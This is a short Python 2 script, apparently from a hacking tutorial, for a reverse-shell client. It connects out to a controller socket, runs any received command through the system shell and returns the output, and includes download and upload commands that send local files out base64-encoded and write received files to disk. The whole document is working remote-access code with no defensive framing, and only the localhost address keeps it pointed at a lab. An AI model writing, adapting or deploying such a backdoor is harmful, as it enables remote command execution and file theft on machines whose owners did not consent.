#!/usr/bin/python2
import socket
import subprocess
import json
import base64

def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue
def shell():
        while True:
                command = reliable_recv ()
                if command == "q":
                        break
                elif command[:8] == "download":
                        with open(command[9:], "rb") as file:
                                reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                    with open(command[7:], "wb") as fin:
                        result = reliable_recv()
                        fin.write(base64.b64decode(result))
                else:
                        try:
                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                result = proc.stdout.read() + proc.stderr.read()
                                reliable_send(result)
                        except: 
                            reliable_send ("[!!] Cant Execute That Command")
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("127.0.0.1",54321))
print("Connection Established To Server")
shell()
sock.close()